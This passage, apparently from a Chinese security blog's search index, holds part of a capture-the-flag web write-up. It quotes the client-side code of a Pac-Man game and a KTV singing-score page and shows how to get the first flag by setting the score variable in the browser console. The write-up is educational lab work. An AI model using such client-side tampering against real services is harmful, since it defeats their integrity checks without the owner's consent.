协议的数据包\n","date":"2025-05-14T01:15:30+08:00","permalink":"https://blog.928330.xyz/p/wiresharktshark%E7%AE%80%E6%98%93%E6%8C%87%E5%8C%97/","title":"wireshark\u0026tshark简易指北"},{"content":"吃豆人 连上环境后f12,发现脚本game.js:\nfunction startGame() { document.getElementById(\u0026#34;start-screen\u0026#34;).style.display = \u0026#34;none\u0026#34;; document.getElementById(\u0026#34;game\u0026#34;).style.display = \u0026#34;block\u0026#34;; initGame(); } const canvas = document.getElementById(\u0026#34;game\u0026#34;); const ctx = canvas.getContext(\u0026#34;2d\u0026#34;); const box = 20; let people, balls, score, dx, dy, isGameOver, game; let redBallCount, blueBallCount; let hasGotFlag = false; function initGame() { people = [{ x: 200, y: 200 }]; dx = box; dy = 0; score = 0; isGameOver = false; hasGotFlag = false; redBallCount = 1000; blueBallCount = 1; balls = []; spawnBalls(); if (game) clearInterval(game); game = setInterval(draw, 150); } document.addEventListener(\u0026#34;keydown\u0026#34;, dir); function dir(e) { if (e.key === \u0026#34;ArrowUp\u0026#34; \u0026amp;\u0026amp; dy === 0) { dx = 0; dy = -box; } else if (e.key === \u0026#34;ArrowDown\u0026#34; \u0026amp;\u0026amp; dy === 0) { dx = 0; dy = box; } else if (e.key === \u0026#34;ArrowLeft\u0026#34; \u0026amp;\u0026amp; dx === 0) { dx = -box; dy = 0; } else if (e.key === \u0026#34;ArrowRight\u0026#34; \u0026amp;\u0026amp; dx === 0) { dx = box; dy = 0; } else if (e.key === \u0026#34; \u0026#34;) { // 空格重开 initGame(); } } function draw() { if (isGameOver) return; ctx.clearRect(0, 0, 400, 400); ctx.strokeStyle = \u0026#34;white\u0026#34;; ctx.lineWidth = 2; ctx.strokeRect(0, 0, 400, 400); // ren ctx.fillStyle = \u0026#34;lime\u0026#34;; ctx.fillRect(people[0].x, people[0].y, box, box); // 画球 balls.forEach(ball =\u0026gt; { ctx.fillStyle = ball.color; ctx.beginPath(); ctx.arc(ball.x + box / 2, ball.y + box / 2, box / 2 - 2, 0, Math.PI * 2); ctx.fill(); }); // 人移动 let head = { x: people[0].x + dx, y: people[0].y + dy }; // 碰撞判断 if (head.x \u0026lt; 0 || head.x \u0026gt;= 400 || head.y \u0026lt; 0 || head.y \u0026gt;= 400) { gameOver(); return; } // 吃球逻辑 let ateIndex = balls.findIndex(b =\u0026gt; b.x === head.x \u0026amp;\u0026amp; b.y === head.y); if (ateIndex !== -1) { const eaten = balls[ateIndex]; if (eaten.color === \u0026#34;red\u0026#34;) { score += 1; redBallCount--; } else if (eaten.color === \u0026#34;blue\u0026#34;) { score = score * 5; blueBallCount--; } balls.splice(ateIndex, 1); } people[0] = head; // 胜利检测 if (score \u0026gt;= 5000 \u0026amp;\u0026amp; !hasGotFlag) { fetch(\u0026#39;/submit_score\u0026#39;, { method: \u0026#34;POST\u0026#34;, headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34; }, body: JSON.stringify({ score: score }) }) .then(response =\u0026gt; response.json()) .then(data =\u0026gt; { if (data.flag) { alert(\u0026#34;🎉 恭喜！你的flag是：\u0026#34; + data.flag); } else { alert(\u0026#34;未达到指定分数！\u0026#34;); } }); hasGotFlag = true; } // 球吃光了 if (balls.length === 0) { if (redBallCount === 0 \u0026amp;\u0026amp; blueBallCount === 0) { if (score \u0026gt;= 5000) { alert(\u0026#34;你赢了！\u0026#34;); } else { alert(\u0026#34;球全吃完了，但分数不足，游戏失败！\u0026#34;); } isGameOver = true; return; } else { spawnBalls(); } } if ( redBallCount \u0026gt; 0 \u0026amp;\u0026amp; balls.every(b =\u0026gt; b.color !== \u0026#34;red\u0026#34;) \u0026amp;\u0026amp; balls.length \u0026gt; 0 ) { spawnBalls(); } ctx.fillStyle = \u0026#34;white\u0026#34;; ctx.fillText(\u0026#34;Score: \u0026#34; + score, 10, 20); ctx.fillText(\u0026#34;Red left: \u0026#34; + redBallCount, 10, 40); ctx.fillText(\u0026#34;Blue left: \u0026#34; + blueBallCount, 10, 60); } function spawnBalls() { let num = Math.floor(Math.random() * 5) + 1; // 即使红球或蓝球库存为 0，也要刷新蓝球位置（如果还在场上） const blueIndex = balls.findIndex(b =\u0026gt; b.color === \u0026#34;blue\u0026#34;); if (blueIndex !== -1) { balls.splice(blueIndex, 1); } if (redBallCount \u0026lt;= 0 \u0026amp;\u0026amp; blueBallCount \u0026lt;= 0) return; // 特例：只生成一个球 if (num === 1) { if (redBallCount \u0026gt; 0) { balls.push(createBall(\u0026#34;red\u0026#34;)); } else if (blueBallCount \u0026gt; 0) { balls.push(createBall(\u0026#34;blue\u0026#34;)); } return; } // 多于1个球时，先加蓝球（前提：蓝球还未被吃掉） if (blueBallCount \u0026gt; 0) { balls.push(createBall(\u0026#34;blue\u0026#34;)); num--; } // 加红球（前提：库存足够） while (num \u0026gt; 0 \u0026amp;\u0026amp; redBallCount \u0026gt; 0) { balls.push(createBall(\u0026#34;red\u0026#34;)); num--; } } function createBall(color) { let x, y; do { x = box * Math.floor(Math.random() * 20); y = box * Math.floor(Math.random() * 20); } while (balls.some(b =\u0026gt; b.x === x \u0026amp;\u0026amp; b.y === y) || (people[0].x === x \u0026amp;\u0026amp; people[0].y === y)); return { x, y, color }; } function gameOver() { alert(\u0026#34;你撞墙了，游戏失败！得分：\u0026#34; + score + \u0026#34;\\n按空格键重新开始\u0026#34;); isGameOver = true; } // 启动 //initGame(); 看下面这一段：\nif (score \u0026gt;= 5000 \u0026amp;\u0026amp; !hasGotFlag) { fetch(\u0026#39;/submit_score\u0026#39;, { method: \u0026#34;POST\u0026#34;, headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34; }, body: JSON.stringify({ score: score }) }) 只要满足score\u0026gt;=5000就能获取 flag\n控制台输入以下命令即可：\nscore = 5000; 麦霸评分 审查代码：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;f4k3 KTY 评分系统\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f5f5f5; } .container { background-color: #fff; border-radius: 8px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); } .header { text-align: center; margin-bottom: 30px; } .header h1 { color: #e74c3c; margin-bottom: 10px; } .controls { display: flex; flex-direction: column; align-items: center; gap: 20px; margin-bottom: 30px; } .button { padding: 12px 25px; font-size: 16px; background-color: #e74c3c; color: white; border: none; border-radius: 4px; cursor: pointer; transition: background-color 0.3s; } .button:hover { background-color: #c0392b; } .button:disabled { background-color: #95a5a6; cursor: not-allowed; } .result { margin-top: 20px; padding: 15px; border-radius: 4px; text-align: center; } .result-low { background-color: #d6eaf8; color: #2980b9; } .result-medium { background-color: #fdebd0; color: #e67e22; } .result-high { background-color: #d5f5e3; color: #27ae60; } .result-perfect { background-color: #ebdef0; color: #8e44ad; } .audio-container { margin: 20px 0; display: flex; flex-direction: column; align-items: center; } .audio-container h3 { margin-bottom: 10px; } .modal { display: none; position: fixed; z-index: 1; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.7); } .modal-content { position: relative; background-color: #fefefe; margin: 15% auto; padding: 30px; border-radius: 8px; width: 70%; max-width: 500px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.2); animation: modalopen 0.4s; } @keyframes modalopen { from {opacity: 0; transform: translateY(-30px);} to {opacity: 1; transform: translateY(0);} } .close-button { position: absolute; top: 10px; right: 15px; color: #aaa; font-size: 28px; font-weight: bold; cursor: pointer; } .close-button:hover { color: #333; } .flag { margin: 30px 0; padding: 15px; font-size: 20px; font-weight: bold; color: #e74c3c; background-color: #f9ebea; border: 2px dashed #e74c3c; border-radius: 5px; } .timer { font-size: 24px; font-weight: bold; margin: 10px 0; color: #e74c3c; } .visualizer { width: 100%; height: 60px; margin: 20px 0; background-color: #f5f5f5; border-radius: 4px; } .similarity-meter { width: 100%; height: 20px; background-color: #ecf0f1; border-radius: 10px; margin: 15px 0; overflow: hidden; } .similarity-value { height: 100%; width: 0%; background: linear-gradient(to right, #3498db, #2ecc71, #f1c40f, #e74c3c); border-radius: 10px; transition: width 0.5s ease-in-out; } .loader { border: 5px solid #f3f3f3; border-top: 5px solid #e74c3c; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; display: none; } @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } .cooldown { font-size: 18px; margin-top: 10px; color: #e74c3c; font-weight: bold; } .warning { background-color: #fadbd8; padding: 10px; border-radius: 5px; margin: 10px 0; color: #c0392b; } /* 添加退出确认对话框样式 */ .exit-confirm-modal { display: none; position: fixed; z-index: 2; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.7); } .exit-confirm-content { position: relative; background-color: #fff2cc; margin: 15% auto; padding: 30px; border-radius: 8px; width: 70%; max-width: 500px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.2); animation: modalopen 0.4s; border-left: 5px solid #e74c3c; } .exit-confirm-title { color: #e74c3c; font-size: 20px; margin-bottom: 15px; } .exit-confirm-buttons { display: flex; justify-content: center; gap: 20px; margin-top: 20px; } .exit-confirm-buttons button { padding: 10px 20px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; } .exit-confirm-stay { background-color: #3498db; color: white; } .exit-confirm-leave { background-color: #e74c3c; color: white; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;header\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;KTV 录音评分系统\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;大家都会逆战吧, have a try \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;audio-container\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;逆战\u0026amp;张杰:\u0026lt;/h3\u0026gt; \u0026lt;audio id=\u0026#34;originalAudio\u0026#34; controls\u0026gt; \u0026lt;source id=\u0026#34;originalAudioSource\u0026#34; src=\u0026#34;/original.wav\u0026#34; type=\u0026#34;audio/wav\u0026#34;\u0026gt; 您的浏览器不支持音频播放 \u0026lt;/audio\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;warningMessage\u0026#34; class=\u0026#34;warning\u0026#34; style=\u0026#34;display:none;\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;controls\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;timer\u0026#34; class=\u0026#34;timer\u0026#34;\u0026gt;00:00\u0026lt;/div\u0026gt; \u0026lt;canvas id=\u0026#34;visualizer\u0026#34; class=\u0026#34;visualizer\u0026#34;\u0026gt;\u0026lt;/canvas\u0026gt; \u0026lt;div class=\u0026#34;similarity-meter\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;similarityValue\u0026#34; class=\u0026#34;similarity-value\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button id=\u0026#34;recordButton\u0026#34; class=\u0026#34;button\u0026#34;\u0026gt;开始录音\u0026lt;/button\u0026gt; \u0026lt;div id=\u0026#34;cooldownTimer\u0026#34; class=\u0026#34;cooldown\u0026#34; style=\u0026#34;display:none;\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;loader\u0026#34; class=\u0026#34;loader\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;result\u0026#34; class=\u0026#34;result\u0026#34; style=\u0026#34;display:none;\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;!-- 录音预览 --\u0026gt; \u0026lt;div class=\u0026#34;audio-container\u0026#34; id=\u0026#34;recordingContainer\u0026#34; style=\u0026#34;display:none;\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;你的录音:\u0026lt;/h3\u0026gt; \u0026lt;audio id=\u0026#34;recordedAudio\u0026#34; controls\u0026gt;\u0026lt;/audio\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- FLAG弹窗 --\u0026gt; \u0026lt;div id=\u0026#34;flagModal\u0026#34; class=\u0026#34;modal\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;modal-content\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;close-button\u0026#34; onclick=\u0026#34;closeModal()\u0026#34;\u0026gt;\u0026amp;times;\u0026lt;/span\u0026gt; \u0026lt;h2\u0026gt;恭喜你！歌神级别！\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;你的演唱简直完美，获得了最高评价！\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;flag\u0026#34; id=\u0026#34;flagContent\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;button class=\u0026#34;button\u0026#34; onclick=\u0026#34;closeModal()\u0026#34;\u0026gt;谢谢\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;exitConfirmModal\u0026#34; class=\u0026#34;exit-confirm-modal\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;exit-confirm-content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;exit-confirm-title\u0026#34;\u0026gt;⚠️ 警告\u0026lt;/div\u0026gt; \u0026lt;p\u0026gt;若您退出当下页面，所有录制的录音都会被删除！\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;exit-confirm-buttons\u0026#34;\u0026gt; \u0026lt;button id=\u0026#34;stayButton\u0026#34; class=\u0026#34;exit-confirm-stay\u0026#34;\u0026gt;留在页面\u0026lt;/button\u0026gt; \u0026lt;button id=\u0026#34;leaveButton\u0026#34; class=\u0026#34;exit-confirm-leave\u0026#34;\u0026gt;确认退出\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; let audioContext; let analyser; let microphone; let mediaRecorder; let audioChunks = []; let isRecording = false; let startTime; let timerInterval; let visualizerContext; // 时间 let lastRequestTime = 0; const MIN_REQUEST_INTERVAL = 10000; // 10秒，与服务器端保持一致 let cooldownInterval = null; // DOM元素 const recordButton = document.getElementById(\u0026#39;recordButton\u0026#39;); const timer = document.getElementById(\u0026#39;timer\u0026#39;); const visualizer = document.getElementById(\u0026#39;visualizer\u0026#39;); const recordingContainer = document.getElementById(\u0026#39;recordingContainer\u0026#39;); const recordedAudio = document.getElementById(\u0026#39;recordedAudio\u0026#39;); const result = document.getElementById(\u0026#39;result\u0026#39;); const loader = document.getElementById(\u0026#39;loader\u0026#39;); const similarityValue = document.getElementById(\u0026#39;similarityValue\u0026#39;); const flagModal = document.getElementById(\u0026#39;flagModal\u0026#39;); const flagContent = document.getElementById(\u0026#39;flagContent\u0026#39;); const cooldownTimer = document.getElementById(\u0026#39;cooldownTimer\u0026#39;); const warningMessage = document.getElementById(\u0026#39;warningMessage\u0026#39;); const originalAudio = document.getElementById(\u0026#39;originalAudio\u0026#39;); const originalAudioSource = document.getElementById(\u0026#39;originalAudioSource\u0026#39;); originalAudio.addEventListener(\u0026#39;error\u0026#39;, function(e) { console.error(\u0026#39;音频加载失败:\u0026#39;, e); warningMessage.textContent = \u0026#39;原始音频加载失败，请刷新页面重试\u0026#39;; warningMessage.style.display = \u0026#39;block\u0026#39;; fetch(\u0026#39;/get-original-audio\u0026#39;) .then(response =\u0026gt; response.json()) .then(data =\u0026gt; { if (data \u0026amp;\u0026amp; data.url) { console.log(\u0026#39;从API获取音频URL:\u0026#39;, data.url); originalAudioSource.src = data.url + \u0026#39;?t=\u0026#39; + new Date().getTime(); // 添加时间戳防止缓存 originalAudio.load(); } }) .catch(err =\u0026gt; { console.error(\u0026#39;获取音频URL失败:\u0026#39;, err); }); }); // 添加退出确认对话框元素 const exitConfirmModal = document.getElementById(\u0026#39;exitConfirmModal\u0026#39;); const stayButton = document.getElementById(\u0026#39;stayButton\u0026#39;); const leaveButton = document.getElementById(\u0026#39;leaveButton\u0026#39;); let currentRecordingFilename = null; visualizerContext = visualizer.getContext(\u0026#39;2d\u0026#39;); visualizer.width = visualizer.offsetWidth; visualizer.height = visualizer.offsetHeight; recordButton.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { if (!isRecording) { if (!canMakeRequest()) { showCooldownMessage(); return; } // 如果有上一段录音，先清理 if (currentRecordingFilename) { cleanRecording(currentRecordingFilename); currentRecordingFilename = null; } startRecording(); } else { stopRecording(); } }); // 检查是否可以发送请求 function canMakeRequest() { const now = Date.now(); return now - lastRequestTime \u0026gt;= MIN_REQUEST_INTERVAL; } // 限时，避免过度请求 function showCooldownMessage() { const now = Date.now(); const remainingTime = Math.ceil((MIN_REQUEST_INTERVAL - (now - lastRequestTime)) / 1000); cooldownTimer.textContent = `请等待 ${remainingTime} 秒后再试`; cooldownTimer.style.display = \u0026#39;block\u0026#39;; if (cooldownInterval) { clearInterval(cooldownInterval); } cooldownInterval = setInterval(() =\u0026gt; { const currentTime = Date.now(); const remaining = Math.ceil((MIN_REQUEST_INTERVAL - (currentTime - lastRequestTime)) / 1000); if (remaining \u0026lt;= 0) { clearInterval(cooldownInterval); cooldownTimer.style.display = \u0026#39;none\u0026#39;; cooldownTimer.textContent = \u0026#39;\u0026#39;; } else { cooldownTimer.textContent = `请等待 ${remaining} 秒后再试`; } }, 1000); } function updateTimer() { const elapsedTime = Math.floor((Date.now() - startTime) / 1000); const minutes = Math.floor(elapsedTime / 60).toString().padStart(2, \u0026#39;0\u0026#39;); const seconds = (elapsedTime % 60).toString().padStart(2, \u0026#39;0\u0026#39;); timer.textContent = `${minutes}:${seconds}`; } // 可视化音频输入 function visualize() { if (!audioContext || audioContext.state === \u0026#39;closed\u0026#39;) return; const bufferLength = analyser.frequencyBinCount; const dataArray = new Uint8Array(bufferLength); const draw = () =\u0026gt; { if (!isRecording) return; requestAnimationFrame(draw); analyser.getByteFrequencyData(dataArray); visualizerContext.clearRect(0, 0, visualizer.width, visualizer.height); const barWidth = (visualizer.width / bufferLength) * 2.5; let x = 0; for (let i = 0; i \u0026lt; bufferLength; i++) { const barHeight = (dataArray[i] / 255) * visualizer.height; // 使用彩色渐变效果 const hue = i / bufferLength * 360; visualizerContext.fillStyle = `hsl(${hue}, 100%, 50%)`; visualizerContext.fillRect(x, visualizer.height - barHeight, barWidth, barHeight); x += barWidth + 1; } }; draw(); } async function startRecording() { try { result.style.display = \u0026#39;none\u0026#39;; recordingContainer.style.display = \u0026#39;none\u0026#39;; warningMessage.style.display = \u0026#39;none\u0026#39;; try { const prepareResponse = await fetch(\u0026#39;/prepare-recording\u0026#39;); if (!prepareResponse.ok) { console.warn(\u0026#39;预清理请求失败，继续录音:\u0026#39;, prepareResponse.statusText); } else { // 检查内容类型 const contentType = prepareResponse.headers.get(\u0026#39;content-type\u0026#39;); if (contentType \u0026amp;\u0026amp; contentType.includes(\u0026#39;application/json\u0026#39;)) { const data = await prepareResponse.json(); console.log(\u0026#39;预清理结果:\u0026#39;, data.message); } else { console.warn(\u0026#39;预清理响应不是JSON格式，继续录音\u0026#39;); } } } catch (cleanError) { console.warn(\u0026#39;预清理出错，继续录音:\u0026#39;, cleanError); } if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { throw new Error(\u0026#39;您的浏览器不支持录音功能。请使用Chrome, Firefox或Edge的最新版本。\u0026#39;); } try { // 获取录音权限 const stream = await navigator.mediaDevices.getUserMedia({ audio: true }); audioContext = new (window.AudioContext || window.webkitAudioContext)(); analyser = audioContext.createAnalyser(); microphone = audioContext.createMediaStreamSource(stream); microphone.connect(analyser); analyser.fftSize = 256; const bufferLength = analyser.frequencyBinCount; const dataArray = new Uint8Array(bufferLength); if (typeof MediaRecorder === \u0026#39;undefined\u0026#39;) { throw new Error(\u0026#39;您的浏览器不支持MediaRecorder API。请使用Chrome, Firefox或Edge的最新版本。\u0026#39;); } // 创建媒体记录器 let mimeType = \u0026#39;audio/wav\u0026#39;; // 检查浏览器是否支持指定的MIME类型 if (!MediaRecorder.isTypeSupported(mimeType)) { console.warn(\u0026#39;浏览器不支持audio/wav格式，使用默认格式\u0026#39;); mimeType = \u0026#39;\u0026#39;; } const mediaRecorderOptions = mimeType ? { mimeType: mimeType, audioBitsPerSecond: 16000 } : { audioBitsPerSecond: 16000 }; mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions); audioChunks = []; // 收集录音数据 mediaRecorder.ondataavailable = (event) =\u0026gt; { audioChunks.push(event.data); }; // 录音停止后的处理 mediaRecorder.onstop = () =\u0026gt; { const audioBlob = new Blob(audioChunks, { type: \u0026#39;audio/wav\u0026#39; }); const audioUrl = URL.createObjectURL(audioBlob); recordedAudio.src = audioUrl; recordingContainer.style.display = \u0026#39;block\u0026#39;; uploadRecording(audioBlob); }; mediaRecorder.start(); isRecording = true; recordButton.textContent = \u0026#39;停止录音\u0026#39;; recordButton.style.backgroundColor = \u0026#39;#c0392b\u0026#39;; startTime = Date.now(); updateTimer(); timerInterval = setInterval(updateTimer, 1000); visualize(); } catch (mediaError) { handleMediaError(mediaError); } } catch (error) { console.error(\u0026#39;录音功能错误:\u0026#39;, error); showErrorMessage(error.message || \u0026#39;无法访问麦克风，请确保您已授予录音权限。\u0026#39;); } } // 停止录音 function stopRecording() { console.log(\u0026#39;停止录音函数被调用，当前状态:\u0026#39;, { isRecording: isRecording, mediaRecorderExists: !!mediaRecorder, mediaRecorderState: mediaRecorder ? mediaRecorder.state : \u0026#39;undefined\u0026#39; }); try { if (!mediaRecorder) { console.error(\u0026#39;MediaRecorder对象不存在，无法停止录音\u0026#39;); showErrorMessage(\u0026#39;录音设备异常，请刷新页面重试\u0026#39;); isRecording = false; recordButton.textContent = \u0026#39;开始录音\u0026#39;; recordButton.style.backgroundColor = \u0026#39;#e74c3c\u0026#39;; return; } if (!isRecording) { console.warn(\u0026#39;状态显示未在录音中，但停止录音按钮被点击\u0026#39;); return; } // 确保MediaRecorder处于录音状态才能停止 if (mediaRecorder.state === \u0026#39;recording\u0026#39; || mediaRecorder.state === \u0026#39;paused\u0026#39;) { // 请求数据 mediaRecorder.requestData(); // 停止录音 mediaRecorder.stop(); console.log(\u0026#39;MediaRecorder已停止\u0026#39;); } else { console.warn(`MediaRecorder状态异常: ${mediaRecorder.state}`); } //UI更新 isRecording = false; recordButton.textContent = \u0026#39;开始录音\u0026#39;; recordButton.style.backgroundColor = \u0026#39;#e74c3c\u0026#39;; // 停止计时器 if (timerInterval) { clearInterval(timerInterval); console.log(\u0026#39;计时器已停止\u0026#39;); } // 关闭音频流 if (audioContext \u0026amp;\u0026amp; audioContext.state !== \u0026#39;closed\u0026#39;) { if (microphone) { microphone.disconnect(); console.log(\u0026#39;麦克风已断开连接\u0026#39;); } } if (audioChunks.length \u0026gt; 0 \u0026amp;\u0026amp; mediaRecorder.state !== \u0026#39;recording\u0026#39;) { console.log(\u0026#39;手动处理录音数据\u0026#39;); const audioBlob = new Blob(audioChunks, { type: \u0026#39;audio/wav\u0026#39; }); const audioUrl = URL.createObjectURL(audioBlob); recordedAudio.src = audioUrl; recordingContainer.style.display = \u0026#39;block\u0026#39;; // 上传录音 uploadRecording(audioBlob); } } catch (error) { console.error(\u0026#39;停止录音时出错:\u0026#39;, error); showErrorMessage(\u0026#39;停止录音时出错，请刷新页面重试\u0026#39;); isRecording = false; recordButton.textContent = \u0026#39;开始录音\u0026#39;; recordButton.style.backgroundColor = \u0026#39;#e74c3c\u0026#39;; } } // 处理媒体访问错误 function handleMediaError(error) { console.error(\u0026#39;麦克风访问错误:\u0026#39;, error); let errorMessage = \u0026#39;无法访问麦克风，请确保您已授予录音权限。\u0026#39;; // 根据错误类型提供具体的错误信息 if (error.name === \u0026#39;NotAllowedError\u0026#39; || error.name === \u0026#39;PermissionDeniedError\u0026#39;) { errorMessage = \u0026#39;您已拒绝麦克风访问权限。请点击浏览器地址栏的锁图标，更改麦克风权限设置，然后刷新页面。\u0026#39;; } else if (error.name === \u0026#39;NotFoundError\u0026#39; || error.name === \u0026#39;DevicesNotFoundError\u0026#39;) { errorMessage = \u0026#39;未检测到麦克风设备。请确认您的麦克风已正确连接，并且没有被系统禁用。\u0026#39;; } else if (error.name === \u0026#39;NotReadableError\u0026#39; || error.name === \u0026#39;TrackStartError\u0026#39;) { errorMessage = \u0026#39;麦克风正在被其他应用程序使用。请关闭可能正在使用麦克风的其他应用，然后刷新页面重试。\u0026#39;; } else if (error.name === \u0026#39;OverconstrainedError\u0026#39;) { errorMessage = \u0026#39;麦克风设置约束条件无法满足。请使用其他麦克风设备重试。\u0026#39;; } else if (error.name === \u0026#39;TypeError\u0026#39;) { errorMessage = \u0026#39;录音参数错误。请刷新页面重试。\u0026#39;; } else if (error.name === \u0026#39;AbortError\u0026#39;) { errorMessage = \u0026#39;麦克风访问请求被中断。请刷新页面重试。\u0026#39;; } else if (error.name === \u0026#39;SecurityError\u0026#39;) { errorMessage = \u0026#39;浏览器安全设置阻止了麦克风访问。请使用HTTPS连接或localhost访问本站点。\u0026#39;; } showErrorMessage(errorMessage); } // 清理录音 function cleanRecording(filename) { if (!filename) return; fetch(`/clean-recording/${filename}`, { method: \u0026#39;DELETE\u0026#39; }) .then(response =\u0026gt; response.json()) .then(data =\u0026gt; { console.log(\u0026#39;清理录音结果:\u0026#39;, data.message); }) .catch(error =\u0026gt; { console.error(\u0026#39;清理录音出错:\u0026#39;, error); }); } function cleanAllRecordings() { fetch(\u0026#39;/clean-all-recordings\u0026#39;, { method: \u0026#39;DELETE\u0026#39; }) .then(response =\u0026gt; response.json()) .then(data =\u0026gt; { console.log(\u0026#39;清理所有录音结果:\u0026#39;, data.message); }) .catch(error =\u0026gt; { console.error(\u0026#39;清理所有录音出错:\u0026#39;, error); }); } function uploadRecording(audioBlob) { loader.style.display = \u0026#39;block\u0026#39;; result.style.display = \u0026#39;none\u0026#39;; similarityValue.style.width = \u0026#39;0%\u0026#39;; lastRequestTime = Date.now(); const formData = new FormData(); formData.append(\u0026#39;audio\u0026#39;, audioBlob, \u0026#39;recording.wav\u0026#39;); fetch(\u0026#39;/compare-recording\u0026#39;, { method: \u0026#39;POST\u0026#39;, body: formData }) .then(response =\u0026gt; { // 检查响应状态 if (!response.ok) { throw new Error(`服务器响应错误: ${response.status} ${response.statusText}`); } return response.json(); }) .then(data =\u0026gt; { // 隐藏加载状态 loader.style.display = \u0026#39;none\u0026#39;; // 如果成功获取到录音文件名，保存它 if (data.filename) { currentRecordingFilename = data.filename; } // 显示匹配度 const similarity = parseFloat(data.similarity); similarityValue.style.width = `${similarity}%`; // 显示结果 result.textContent = `匹配度: ${similarity.toFixed(2)}% - ${data.message}`; result.style.display = \u0026#39;block\u0026#39;; // 根据匹配度设置不同的样式 result.className = \u0026#39;result\u0026#39;; if (similarity \u0026gt;= 98) { result.classList.add(\u0026#39;result-perfect\u0026#39;); } else if (similarity \u0026gt;= 85) { result.classList.add(\u0026#39;result-high\u0026#39;); } else if (similarity \u0026gt;= 70) { result.classList.add(\u0026#39;result-medium\u0026#39;); } else { result.classList.add(\u0026#39;result-low\u0026#39;); } // 如果有FLAG，显示FLAG弹窗 if (data.flag) { showFlagModal(data.flag); } }) .catch(error =\u0026gt; { console.error(\u0026#39;上传录音出错:\u0026#39;, error); loader.style.display = \u0026#39;none\u0026#39;; result.textContent = \u0026#39;评分失败，请稍后重试: \u0026#39; + error.message; result.className = \u0026#39;result result-low\u0026#39;; result.style.display = \u0026#39;block\u0026#39;; }); } function showErrorMessage(message) { warningMessage.textContent = message; warningMessage.style.display = \u0026#39;block\u0026#39;; isRecording = false; recordButton.textContent = \u0026#39;开始录音\u0026#39;; recordButton.style.backgroundColor = \u0026#39;#e74c3c\u0026#39;; if (timerInterval) { clearInterval(timerInterval); } } // 显示FLAG弹窗 function showFlagModal(flag) { flagContent.textContent = flag; flagModal.style.display = \u0026#39;block\u0026#39;; } function closeModal() { flagModal.style.display = \u0026#39;none\u0026#39;; } window.onclick = function(event) { if (event.target === flagModal) { flagModal.style.display = \u0026#39;none\u0026#39;; } } // 页面卸载前处理 window.addEventListener(\u0026#39;beforeunload\u0026#39;, function(event) { // 显示确认对话框 exitConfirmModal.style.display = \u0026#39;block\u0026#39;; // 阻止页面立即卸载，显示确认对话框 event.preventDefault(); event.returnValue = \u0026#39;\u0026#39;; // 注意：现代浏览器出于安全考虑可能会忽略自定义消息 return \u0026#39;若您退出当下页面，所有录制的录音都会被删除！\u0026#39;; }); // 用户选择页面 stayButton.addEventListener(\u0026#39;click\u0026#39;, function() { exitConfirmModal.style.display = \u0026#39;none\u0026#39;; }); leaveButton.addEventListener(\u0026#39;click\u0026#39;, function() { cleanAllRecordings(); exitConfirmModal.style.display = \u0026#39;none\u0026#39;; setTimeout(() =\u0026gt; { window.location.href = \u0026#39;about:blank\u0026#39;; }, 500); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 发现flag获取条件如下：\nif (similarity \u0026gt;= 98) { result.classList.add(\u0026#39;result-perfect\u0026#39;); } 但是紧接着又发现：\nif (data.flag) { showFlagModal(data.flag); } 